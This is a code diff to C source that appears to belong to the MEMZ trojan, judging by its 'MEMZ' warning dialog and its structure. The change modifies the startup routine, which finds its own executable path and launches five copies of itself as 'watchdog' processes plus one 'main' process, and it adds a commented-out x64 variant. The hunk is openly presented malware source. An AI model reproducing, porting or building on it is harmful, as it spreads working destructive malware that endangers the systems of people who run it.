@@ -53,22 +53,46 @@ STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 			ExitProcess(0);
 		}
 
-		wchar_t *fn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 8192*2);
+		//(x86)
+		LPWSTR fn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 8192*2);
 		GetModuleFileName(NULL, fn, 8192);
-
 		for (int i = 0; i < 5; i++)
-			ShellExecute(NULL, NULL, fn, L"/watchdog", NULL, SW_SHOWDEFAULT);
+			ShellExecute(NULL, NULL, fn, L"watchdog", NULL, SW_SHOWDEFAULT); 
 
 		SHELLEXECUTEINFO info;
 		info.cbSize = sizeof(SHELLEXECUTEINFO);
 		info.lpFile = fn;
-		info.lpParameters = L"/main";
+		info.lpParameters = L"main";
 		info.fMask = SEE_MASK_NOCLOSEPROCESS;
 		info.hwnd = NULL;
 		info.lpVerb = NULL;
 		info.lpDirectory = NULL;
 		info.hInstApp = NULL;
 		info.nShow = SW_SHOWDEFAULT;
+			
+		
+
+		/*
+		//(x64)
+		LPSTR fn = (LPSTR)LocalAlloc(LMEM_ZEROINIT, 8192*2);
+		GetModuleFileName(NULL, fn, 8192);
+		for (int i = 0; i < 5; i++)
+		ShellExecute(NULL, NULL, fn, "-watchdog", NULL, SW_SHOWDEFAULT);
+
+		
+
+		SHELLEXECUTEINFO info;
+		info.cbSize = sizeof(SHELLEXECUTEINFO);
+		info.lpFile = fn;
+		info.lpParameters = "-main";
+		info.fMask = SEE_MASK_NOCLOSEPROCESS;
+		info.hwnd = NULL;
+		info.lpVerb = NULL;
+		info.lpDirectory = NULL;
+		info.hInstApp = NULL;
+		info.nShow = SW_SHOWDEFAULT;
+
+		*/
 
 		ShellExecuteEx(&info);
 
